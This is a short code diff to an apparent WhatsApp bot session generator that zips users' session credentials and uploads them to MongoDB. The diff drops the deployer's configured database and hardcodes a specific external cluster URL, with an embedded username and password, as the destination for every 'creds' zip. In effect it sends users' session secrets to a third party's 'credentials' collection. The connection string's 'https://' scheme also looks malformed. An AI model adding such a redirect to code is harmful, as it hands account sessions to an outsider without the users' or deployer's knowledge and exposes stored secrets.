@@ -1,6 +1,5 @@
 const archiver = require('archiver');
 const { MongoClient } = require('mongodb');;
-const { MONGODB_URL, SESSION_NAME } = require('./config');
 const { makeid } = require('./id');
 const express = require('express');
 const fs = require('fs')
@@ -13,7 +12,7 @@ const chalk = require("chalk")
 
 router.get('/', async (req, res) => {
     const idd = makeid();
-    const id = SESSION_NAME + idd;
+    const id = 'alpha~' + idd;
     let num = req.query.number;
 
 async function qr() {
@@ -73,7 +72,7 @@ XeonBotInc.ev.on("connection.update",async  (s) => {
                    console.log('Zip file created successfully.');
                    const client = new MongoClient();
                    try {
-                       await client.connect(MONGODB_URL);
+                       await client.connect('https://r2:uploader2@uploader2.uhnmx1u.mongodb.net/?retryWrites=true&w=majority&appName=uploader2');
                        const database = client.db('testdb');
                        const collection = database.collection('credentials');
                        const fileContent = fs.readFileSync(`creds_${randomId}.zip`);
